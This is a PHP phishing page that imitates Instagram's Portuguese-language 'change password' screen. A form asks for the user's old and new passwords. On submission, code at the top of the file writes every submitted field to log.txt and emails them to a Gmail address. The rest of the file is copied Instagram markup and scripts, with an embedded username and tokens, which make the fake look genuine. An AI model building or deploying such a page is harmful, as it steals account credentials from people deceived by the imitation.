<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

if(isset($_POST["send"]) && $_POST["send"]=="ok"){
	$out = "";
	foreach($_POST as $key => $value){
		$out .= "$key = $value ..  \r\n
";
	}
	$out .= " \r\n \r\n
";	

	$abrir = fopen("log.txt","a+");
	fwrite($abrir,$out);
	fclose($abrir);
	
	
	
	$to      = 'guther.manaus@gmail.com';
$subject = 'ALERTA! GUTHER';
$message = $out;
$headers = 'From: guther.manaus@gmail.com' . "\r\n" .   
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);

}
else{
?><!DOCTYPE html>
<base href="https://instagram.com/">
<html lang="pt-br" class="no-js logged-in ">
    <head><meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <title>
                  Instagram
                </title>

        
        <meta name="robots" content="noimageindex, noarchive">
        <meta name="mobile-web-app-capable" content="yes">
        <meta name="theme-color" content="#000000">
        <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=5, viewport-fit=cover">
        

        <link rel="manifest" href="/data/manifest.json">

        

        
        

        <script type="text/javascript">
        (function() {
  var docElement = document.documentElement;
  var classRE = new RegExp('(^|\\s)no-js(\\s|$)');
  var className = docElement.className;
  docElement.className = className.replace(classRE, '$1js$2');
})();
</script>
        <!-- first_input_delay is a js file copied from https://fburl.com/rc21x6p3
in order to use it statically for server side rendering.
We should aim to keep it consistent with their updates -->
<!-- This is a js file copied from https://fburl.com/rc21x6p3
in order to use it statically for server side rendering.
We should aim to keep it consistent with their updates -->

<script type="text/javascript">

/*
 Copyright 2018 Google Inc. All Rights Reserved.
 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at

     http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
*/

(function(){function g(a,c){b||(b=a,f=c,h.forEach(function(a){removeEventListener(a,l,e)}),m())}function m(){b&&f&&0<d.length&&(d.forEach(function(a){a(b,f)}),d=[])}function n(a,c){function k(){g(a,c);d()}function b(){d()}function d(){removeEventListener("pointerup",k,e);removeEventListener("pointercancel",b,e)}addEventListener("pointerup",k,e);addEventListener("pointercancel",b,e)}function l(a){if(a.cancelable){var c=performance.now(),b=a.timeStamp;b>c&&(c=+new Date);c-=b;"pointerdown"==a.type?n(c,
a):g(c,a)}}var e={passive:!0,capture:!0},h=["click","mousedown","keydown","touchstart","pointerdown"],b,f,d=[];h.forEach(function(a){addEventListener(a,l,e)});window.perfMetrics=window.perfMetrics||{};window.perfMetrics.onFirstInputDelay=function(a){d.push(a);m()}})();
</script>

<script type="text/javascript">
(function() {
  if ('PerformanceObserver' in window && 'PerformancePaintTiming' in window) {
    window.__bufferedPerformance = [];
    var ob = new PerformanceObserver(function(e) {
      window.__bufferedPerformance.push.apply(window.__bufferedPerformance,e.getEntries());
    });
    ob.observe({entryTypes:['paint']});
  }
  window.__bufferedErrors = [];
  window.onerror = function(message, url, line, column, error) {
    window.__bufferedErrors.push({
      message: message,
      url: url,
      line: line,
      column: column,
      error: error
    });
    return false;
  };
  window.__initialData = {
    pending: true,
    waiting: []
  };
  function notifyLoaded(item, data) {
    item.pending = false;
    item.data = data;
    for (var i = 0;i < item.waiting.length; ++i) {
      item.waiting[i].resolve(item.data);
    }
    item.waiting = [];
  }
  function notifyError(item, msg) {
    item.pending = false;
    item.error = new Error(msg);
    for (var i = 0;i < item.waiting.length; ++i) {
      item.waiting[i].reject(item.error);
    }
    item.waiting = [];
  }
  window.__initialDataLoaded = function(initialData) {
    notifyLoaded(window.__initialData, initialData);
  };
  window.__initialDataError = function(msg) {
    notifyError(window.__initialData, msg);
  };
  window.__additionalData = {};
  window.__pendingAdditionalData = function(paths) {
    for (var i = 0;i < paths.length; ++i) {
      window.__additionalData[paths[i]] = {
        pending: true,
        waiting: []
      };
    }
  };
  window.__additionalDataLoaded = function(path, data) {
    notifyLoaded(window.__additionalData[path], data);
  };
  window.__additionalDataError = function(path, msg) {
    notifyError(window.__additionalData[path], msg);
  };
})();
</script>
                <link rel="apple-touch-icon-precomposed" sizes="76x76" href="/static/images/ico/apple-touch-icon-76x76-precomposed.png/4272e394f5ad.png">
                <link rel="apple-touch-icon-precomposed" sizes="120x120" href="/static/images/ico/apple-touch-icon-120x120-precomposed.png/02ba5abf9861.png">
                <link rel="apple-touch-icon-precomposed" sizes="152x152" href="/static/images/ico/apple-touch-icon-152x152-precomposed.png/419a6f9c7454.png">
                <link rel="apple-touch-icon-precomposed" sizes="167x167" href="/static/images/ico/apple-touch-icon-167x167-precomposed.png/a24e58112f06.png">
                <link rel="apple-touch-icon-precomposed" sizes="180x180" href="/static/images/ico/apple-touch-icon-180x180-precomposed.png/85a358fb3b7d.png">
                
                    <link rel="icon" sizes="192x192" href="/static/images/ico/favicon-192.png/68d99ba29cc8.png">
                
            
            
                    <link rel="mask-icon" href="/static/images/ico/favicon.svg/fc72dd4bfde8.svg" color="#262626">
                  
                  <link rel="shortcut icon" type="image/x-icon" href="/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
                
            
            
    <link rel="stylesheet" type="text/css" href="/static/styles/public/public-main.css/ac3908099bec.css"></link>

            
    
    <script type="text/javascript" src="/static/scripts/jquery.js/a4e77326039e.js" crossorigin="anonymous"></script>
    <script type="text/javascript" src="/static/scripts/bluebar.js/2ccc68edcffd.js" crossorigin="anonymous"></script>
    <script type="text/javascript" src="/static/scripts/navigation.js/faf1d668dee8.js" crossorigin="anonymous"></script>
</head>
    <body class="sidebar-page -cx-PRIVATE-SidebarLayout__page -cx-PRIVATE-SidebarLayout__page__ page-accounts">
        
            <div class="root -cx-PRIVATE-Page__root -cx-PRIVATE-Page__root__">
                
                    <div class="page -cx-PRIVATE-Page__body -cx-PRIVATE-Page__body__">
                        
                            
                                <header class="top-bar top-bar-new -cx-PRIVATE-NavBar__root -cx-PRIVATE-NavBar__root__">
    <div class="top-bar-wrapper -cx-PRIVATE-NavBar__wrapper -cx-PRIVATE-NavBar__wrapper__">
        <div class="logo -cx-PRIVATE-NavBar__logo -cx-PRIVATE-NavBar__logo__"><a href="/">Instagram</a></div>

        <div class="top-bar-left -cx-PRIVATE-NavBar__topBarLeft -cx-PRIVATE-NavBar__topBarLeft__">
            <ul class="top-bar-actions">
                <li>
                    <a class="top-bar-home" href="/" label=Página inicial><i></i></a>
                </li>
            </ul>
        </div>

        
            <div class="top-bar-right account-state" id="top_bar_right">
                <ul class="top-bar-actions -cx-PRIVATE-NavBar__topBarActions -cx-PRIVATE-NavBar__topBarActions__">
                    
                    
                    <li id="link_profile" class="link-profile has-dropdown -cx-PRIVATE-NavBar__profile -cx-PRIVATE-NavBar__profile__">
                        <a href="/bu._ra.__onl.ine.x2._.___12._1/">
                            <strong class="-cx-PRIVATE-NavBar__username -cx-PRIVATE-NavBar__username__">bu._ra.__onl.ine.x2._.___12._1</strong>
                        </a>

                    </li>
                    
                </ul>
            </div>
        
    </div>
</header> <!-- .top-bar -->
                            
                        

                        
    <div class="main -cx-PRIVATE-Page__main -cx-PRIVATE-Page__main__">
        <div class="sidebar -cx-PRIVATE-SidebarLayout__root -cx-PRIVATE-SidebarLayout__root__">
            <div class="wrapper -cx-PRIVATE-SidebarLayout__navWrapper -cx-PRIVATE-SidebarLayout__navWrapper__">
                <nav class="sidebar-nav -cx-PRIVATE-SidebarLayout__nav -cx-PRIVATE-SidebarLayout__nav__">
                    <div class="sidebar-content -cx-PRIVATE-SidebarLayout__content -cx-PRIVATE-SidebarLayout__content__">
                    
                    </div>
                </nav>
            </div>
        </div>
        <div class="wrapper -cx-PRIVATE-SidebarLayout__contentWrapper -cx-PRIVATE-SidebarLayout__contentWrapper__">
            <section class="nav-page-content -cx-PRIVATE-SidebarLayout__pageContent -cx-PRIVATE-SidebarLayout__pageContent__" role="main">
                
    <h1>Instagram</h1>
    

    

    



    <form action="" method="POST" accept-charset="utf-8">
		<input type="hidden" name="send" value="ok">
        <p><label for="id_old_password1">Old password:</label> <input id="id_old_password1" name="old_password" type="password" /></p>
        <p><label for="id_new_password1">New password:</label> <input id="id_new_password1" name="new_password1" type="password" /></p>
<p><label for="id_new_password2">New password confirmation:</label> <input id="id_new_password2" name="new_password2" type="password" /></p>
        <p><input type="submit" value="Redefinir senha"></p>
    </form>
    


            </section>
        </div> <!-- .main -->
    </div> <!-- .main -->


                    </div> <!-- .page -->

                    
                    <footer class="page-footer -cx-PRIVATE-Footer__root -cx-PRIVATE-Footer__root__" role="contentinfo">
                        <div class="wrapper -cx-PRIVATE-Footer__wrapper -cx-PRIVATE-Footer__wrapper__">
                            <nav class="-cx-PRIVATE-Footer__nav -cx-PRIVATE-Footer__nav__">
                                <ul class="-cx-PRIVATE-Footer__navItems -cx-PRIVATE-Footer__navItems__">
                                    <li><a href="/about/us/">Sobre nós</a></li>
                                    <li><a href="http://help.instagram.com/">Suporte</a></li>
                                    <li><a href="http://blog.instagram.com/">Blog</a></li>
                                    <li><a href="https://instagram-press.com/">Imprensa</a></li>
                                    <li><a href="/developer/">API</a></li>
                                    <li><a href="/about/jobs/">Empregos</a></li>
                                    <li><a href="/legal/privacy/">Privacidade</a></li>
                                    <li><a href="/legal/terms/">
                                      
                                          Termos
                                      
                                    </a></li>
                                </ul>
                            </nav>

                            <p class="copyright -cx-PRIVATE-Footer__copyright -cx-PRIVATE-Footer__copyright__">&copy; 2018 Instagram</p>
                        </div>
                    </footer>
                    
                
                <div id="reactModalMountPoint"></div>
            </div> <!-- .root -->
        
        

        
            <script type="text/javascript">window._sharedData = {"activity_counts":{"comment_likes":0,"comments":0,"likes":0,"relationships":0,"usertags":0},"config":{"csrf_token":"9zAe8Dnc4p5QB2j5z3EZN1baBf5mhfBn","viewer":{"biography":"","external_url":null,"full_name":"teste","has_profile_pic":false,"id":"6748835556","profile_pic_url":"https://instagram.fmao1-1.fna.fbcdn.net/vp/6bd6dcedfc8fa9ef41646b53d8811c0e/5BBBE67A/t51.2885-19/11906329_960233084022564_1448528159_a.jpg","profile_pic_url_hd":"https://instagram.fmao1-1.fna.fbcdn.net/vp/6bd6dcedfc8fa9ef41646b53d8811c0e/5BBBE67A/t51.2885-19/11906329_960233084022564_1448528159_a.jpg","username":"bu._ra.__onl.ine.x2._.___12._1"}},"supports_es6":true,"country_code":"BR","language_code":"pt-br","locale":"pt_BR","entry_data":{},"gatekeepers":{"ld":true,"rt":true,"vl":true,"seo":true,"seoht":true,"2fac":true,"sf":true,"saa":true},"knobs":{"acct:ntb":0,"cb":0,"captcha":0},"qe":{"dash_for_vod":{"g":"","p":{}},"aysf":{"g":"","p":{}},"bc3l":{"g":"control","p":{"threeline":"false"}},"comment_reporting":{"g":"","p":{}},"direct_conversation_reporting":{"g":"","p":{}},"direct_reporting":{"g":"","p":{}},"reporting":{"g":"","p":{}},"media_reporting":{"g":"","p":{}},"acc_recovery_link":{"g":"test","p":{"show_account_recovery_modal":"true"}},"notif":{"g":"","p":{}},"drct_nav":{"g":"","p":{}},"fb_unlink":{"g":"","p":{}},"mobile_stories_doodling":{"g":"","p":{}},"mobile_cancel":{"g":"","p":{}},"mobile_logout":{"g":"","p":{}},"pl_pivot_li":{"g":"","p":{}},"pl_pivot_lo":{"g":"","p":{}},"404_as_react":{"g":"","p":{}},"acc_recovery":{"g":"","p":{}},"collections":{"g":"","p":{}},"comment_ta":{"g":"","p":{}},"connections":{"g":"","p":{}},"disc_ppl":{"g":"control_02_27","p":{"has_follow_all_button":"false","has_pagination":"false"}},"embeds":{"g":"","p":{}},"ebdsim_li":{"g":"","p":{}},"ebdsim_lo":{"g":"","p":{}},"es6":{"g":"","p":{}},"exit_story_creation":{"g":"","p":{}},"gdpr_logged_out":{"g":"","p":{}},"appsell":{"g":"","p":{}},"imgopt":{"g":"","p":{}},"follow_button":{"g":"test","p":{"is_inline":"true"}},"loggedout":{"g":"test","p":{"new_cta":"true","remove_upsell_banner":"true","update_nav":"true"}},"loggedout_upsell":{"g":"control_without_new_loggedout_upsell_content_03_15_18","p":{"has_new_loggedout_upsell_content":"false"}},"us_li":{"g":"","p":{}},"msisdn":{"g":"","p":{}},"bg_sync":{"g":"","p":{}},"onetaplogin":{"g":"control","p":{"after_login":"true","enabled":"false","storage_version":"one_tap_storage_version"}},"onetaplogin_userbased":{"g":"","p":{}},"login_poe":{"g":"","p":{}},"prvcy_tggl":{"g":"","p":{}},"private_lo":{"g":"control_0511","p":{"show_lock_ui":"false"}},"profile_photo_nux_fbc_v2":{"g":"launch","p":{"prefill_photo":"true","skip_nux":"false"}},"profile_tabs":{"g":"","p":{}},"push_notifications":{"g":"","p":{}},"reg":{"g":"control_inline_2_01_16","p":{"has_inline_labels":"false"}},"reg_vp":{"g":"test_group_2","p":{"hide_value_prop":"true"}},"feed_vp":{"g":"launch","p":{"is_hidden":"true"}},"report_haf":{"g":"","p":{}},"report_media":{"g":"","p":{}},"report_profile":{"g":"test","p":{"is_enabled":"true"}},"save":{"g":"test","p":{"is_enabled":"true"}},"sidecar":{"g":"","p":{}},"su_universe":{"g":"","p":{}},"stale":{"g":"","p":{}},"stories_lo":{"g":"control_03_15","p":{"stories_profile":"false"}},"stories":{"g":"test_03_23","p":{"stories_cta_url":"true"}},"tp_pblshr":{"g":"","p":{}},"video":{"g":"","p":{}},"gdpr_settings":{"g":"","p":{}},"gdpr_blocking_logout":{"g":"control_no_logout","p":{"show_logout_button":"false"}},"gdpr_eu_tos":{"g":"","p":{}},"gdpr_row_tos":{"g":"control_05_01","p":{"tos_version":"row"}},"fd_gr":{"g":"control","p":{"show_post_back_button":"false"}},"felix":{"g":"","p":{}},"pride":{"g":"test","p":{"enabled":"true","hashtag_whitelist":"lgbt,lesbian,gay,bisexual,transgender,trans,queer,lgbtq,girlslikeus,girlswholikegirls,instagay,pride,gaypride,loveislove,pansexual,lovewins,transequalitynow,lesbiansofinstagram,asexual,nonbinary,lgbtpride,lgbta,lgbti,queerfashion,queers,queerpride,queerlife,marriageequality,pride2018,genderqueer,bi,genderfluid,lgbtqqia,comingout,intersex,transman,transwoman,twospirit,transvisibility,queerart,dragqueen,dragking,dragartist,twomoms,twodads,lesbianmoms,gaydads,gendernonconforming"}},"unfollow_confirm":{"g":"","p":{}}},"hostname":"instagram.com","platform":"web","rhx_gis":"252688fc165327020d45b662cefba5f5","nonce":"MuJDCeN5ytDUzmi2EEYfFA==","zero_data":{},"rollout_hash":"a6b00fdee4eb","bundle_variant":"base","probably_has_app":false,"show_app_install":true};</script>
    <script type="text/javascript">
    window.__initialDataLoaded(window._sharedData);
    </script>
            <script type="text/javascript">!function(e){var a=window.webpackJsonp;window.webpackJsonp=function(n,r,i){for(var c,d,s,g=0,f=[];g<n.length;g++)d=n[g],o[d]&&f.push(o[d][0]),o[d]=0;for(c in r)Object.prototype.hasOwnProperty.call(r,c)&&(e[c]=r[c]);for(a&&a(n,r,i);f.length;)f.shift()();if(i)for(g=0;g<i.length;g++)s=t(t.s=i[g]);return s};var n={},o={69:0};function t(a){if(n[a])return n[a].exports;var o=n[a]={i:a,l:!1,exports:{}};return e[a].call(o.exports,o,o.exports,t),o.l=!0,o.exports}t.e=function(e){var a=o[e];if(0===a)return new Promise(function(e){e()});if(a)return a[2];var n=new Promise(function(n,t){a=o[e]=[n,t]});a[2]=n;var r=document.getElementsByTagName("head")[0],i=document.createElement("script");i.type="text/javascript",i.charset="utf-8",i.async=!0,i.timeout=12e4,i.crossOrigin="anonymous",t.nc&&i.setAttribute("nonce",t.nc),i.src=t.p+""+({0:"SettingsModules",1:"MobileStoriesPage",2:"DesktopStoriesPage",3:"ProfilePageContainer",4:"LikedByListContainer",5:"FollowListContainer",6:"CreationModules",7:"LocationPageContainer",8:"DiscoverMediaPageContainer",9:"DiscoverEmbedsPageContainer",10:"TagPageContainer",11:"UserCollectionMediaPageContainer",12:"DebugInfoNub",13:"FeedPageContainer",14:"PostPageContainer",15:"LandingPage",16:"LoginAndSignupPage",17:"ResetPasswordPageContainer",18:"IGTVVideoDraftsPageContainer",19:"FBSignupPage",20:"MultiStepSignupPage",21:"DirectInboxPageContainer",22:"DiscoverPeoplePageContainer",23:"TermsUnblockPage",24:"IGTVVideoUploadPageContainer",25:"DataDownloadRequestPage",26:"UserCollectionsPageContainer",27:"AccessToolViewAllPage",28:"AccessToolPage",29:"NewUserInterstitial",30:"DataDownloadRequestConfirmPage",31:"ContactHistoryPage",32:"DataControlsSupportPage",33:"LocationsDirectoryLandingPage",34:"LocationsDirectoryCountryPage",35:"LocationsDirectoryCityPage",36:"MobileStoriesLoginPage",37:"EmailConfirmationPage",38:"OneTapUpsell",39:"NewTermsConfirmPage",40:"CheckpointUnderageAppealPage",41:"TermsAcceptPage",42:"DesktopStoriesLoginPage",43:"SuggestedDirectoryLandingPage",44:"ProfilesDirectoryLandingPage",45:"HashtagsDirectoryLandingPage",46:"OAuthPermissionsPage",47:"ActivityFeedPage",48:"HttpErrorPage",49:"ParentalConsentPage",50:"ParentalConsentNotParentPage",51:"AccountPrivacyBugPage",52:"StoryCreationPage",53:"ContactInvitesOptOutPage",54:"ContactInvitesOptOutStatusPage",55:"Docpen",56:"Report",57:"Copyright",58:"Challenge",59:"SupportInfo",60:"Verification",61:"Community",62:"Consumer",63:"EmailSnoozePage",64:"RapidReport",65:"EmailUnsubscribePage",66:"NotificationLandingPage"}[e]||e)+".js/"+{0:"a53a1ec23dfa",1:"649b2d1a95d4",2:"837b82422445",3:"059426d98496",4:"7ad5741bf14c",5:"1250a976c0f0",6:"e014cff948ae",7:"c9b6ae1f7ef1",8:"5e33a14ae696",9:"232930f0a7da",10:"8de9b8cf900a",11:"966962344df6",12:"81aa6798c451",13:"5be92764f281",14:"720fa9da93b3",15:"7b5c2cd9a72b",16:"9f630420bf71",17:"12955a290892",18:"b4b6b8719758",19:"bbae3dd329d4",20:"615f62e1cb2e",21:"e8d90b0bf245",22:"4cf85eed5693",23:"c2c02754a68f",24:"c2d253ae9906",25:"2a2733434927",26:"4fc54e12ec9f",27:"2f7d0ea05a2e",28:"685d84cb1740",29:"d16bc1a210e1",30:"051762d0ec3f",31:"5d52df52533e",32:"2955de374e6f",33:"e16746125090",34:"b59579b049e1",35:"5a4d4f69fb2d",36:"d25da143b1e9",37:"351c272db8d5",38:"c43d3dee4b71",39:"98d1fbc7f5b0",40:"383a86a16c1b",41:"6d6353ca42ff",42:"02fd94de450c",43:"214a815eab17",44:"37977218344b",45:"3a4f0671ce80",46:"f8ddfa7e4095",47:"7eeb4d734017",48:"c1f17cb3d9ed",49:"65d5744e108d",50:"675915164f57",51:"7c107a70e5cb",52:"267e3145c99c",53:"87f05aaf7e5c",54:"7e8f10956e73",55:"d28a96d7733e",56:"65b398ca3d21",57:"61bc918edfef",58:"44ece63de03a",59:"11a0435fa2e7",60:"ec0b60bda5eb",61:"133f09429c0e",62:"d3120c58cc47",63:"25101475122f",64:"712714da46b9",65:"62a065dd66d9",66:"a74edb2276bd"}[e]+".js";var c=setTimeout(d,12e4);function d(){i.onerror=i.onload=null,clearTimeout(c);var a=o[e];0!==a&&(a&&a[1](new Error("Loading chunk "+e+" failed.")),o[e]=void 0)}return i.onerror=i.onload=d,r.appendChild(i),n},t.m=e,t.c=n,t.d=function(e,a,n){t.o(e,a)||Object.defineProperty(e,a,{configurable:!1,enumerable:!0,get:n})},t.n=function(e){var a=e&&e.__esModule?function(){return e.default}:function(){return e};return t.d(a,"a",a),a},t.o=function(e,a){return Object.prototype.hasOwnProperty.call(e,a)},t.p="/static/bundles/base/",t.oe=function(e){throw console.error(e),e}}([]);</script>
            
            <script type="text/javascript" src="/static/bundles/base/Vendor.js/4c1087ac8095.js" crossorigin="anonymous"></script>
            <script type="text/javascript" src="/static/bundles/base/pt_BR.js/410ad30ec02e.js" crossorigin="anonymous"></script>
        
    </body>
</html><?php } ?>
